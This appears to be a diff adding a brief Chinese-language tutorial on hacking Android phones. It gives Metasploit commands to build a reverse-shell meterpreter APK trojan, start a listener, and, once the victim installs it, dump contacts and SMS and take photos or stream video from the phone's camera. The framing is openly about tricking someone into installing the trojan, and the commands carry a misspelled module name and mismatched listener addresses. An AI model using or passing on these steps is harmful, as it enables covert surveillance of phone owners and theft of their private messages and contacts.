@@ -1,0 +1,37 @@
+入侵安卓手机
+
+首先入侵手机的原理是 你需要生成一个安卓手机的木马程序xxx.apk 安卓安装程序安装到你的手机上去。
+然后运行这个安卓程序。然后这个木马就会反弹连接你的电脑，然后你就可以控制他的手机了，原理就这些
+首先条件就是
+1 网络能够联通，手机木马反连接你 他的手机首先能上网，你的ip得是外网ip，如果在内网也可以。
+2 你需要想办法让他安装你生成的木马并运行。就ok了 
+
+步骤1
+生成木马程序  192.168.1.105 我的电脑ip  7777是反连接我的端口号，不能用已经使用的端口号。
+msfpayload android/meterpreter/reverse_tcp LHOST=192.168.1.105 LPORT=7777 R > /root/cracer.apk  
+生成木马的位置名字cracer.apk
+use exploit/mutli/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 172.16.1.105
+exploit
+
+
+
+打开msf用来侦听反连接的木马
+ok 生成完毕了 吧生成好的木马拿出来发给手机
+我安装上安卓木马
+安装完打开
+我们看侦听的结果
+ok 我打开木马
+反链我了
+
+
+dump_contacts????--这个是导出电话
+dump_sms --这个是导出信息
+Webcam_list可以看到有几个摄像头
+-i 1  是选择后摄像头 
+webcam_snap   是拍照    ，看到我电脑了
+webcam_stream  开启摄像头   
+
+ok 就演示这些给大家
+其他功能你们去实验下吧
